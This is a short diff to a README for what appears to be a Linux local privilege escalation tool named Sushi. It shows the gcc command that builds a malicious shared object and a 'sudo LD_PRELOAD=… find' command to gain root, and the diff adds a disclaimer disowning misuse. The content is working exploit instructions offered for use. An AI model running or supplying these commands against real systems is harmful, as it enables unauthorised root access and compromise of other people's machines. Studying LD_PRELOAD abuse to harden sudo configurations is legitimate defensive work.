@@ -6,3 +6,6 @@ Sushi すし, a shared object written in C language to perform LPE (Local Privil
 `gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles`
 - Now use this shared object as a value for LD_PRELOAD and get root privileges:
 `sudo LD_PRELOAD=/home/exploit.so find`
+
+# DISCLAIMER
+I'M NOT RESPONSIBLE FOR ANY MISUSE OF THIS PROGRAM, USE AT YOUR OWN RISK.
